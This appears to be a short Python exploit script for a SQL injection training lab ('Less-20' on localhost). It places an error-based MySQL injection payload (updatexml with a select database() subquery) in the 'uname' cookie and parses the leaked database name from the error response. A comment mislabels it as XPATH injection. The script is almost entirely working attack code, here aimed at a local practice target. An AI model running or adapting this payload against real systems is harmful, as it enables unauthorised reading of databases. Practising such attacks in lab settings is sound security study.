import re
import string
import requests

url='http://localhost/Less-20/'

# XPATH injection
# Error based injection


cookies={
	"uname":"' and updatexml(1,concat('==',(select database()),'=='),1)#"
}

resp=requests.get(url,cookies=cookies)
# print(resp.text)
matches=re.findall("error: '==(.*)==",resp.text)
print(matches)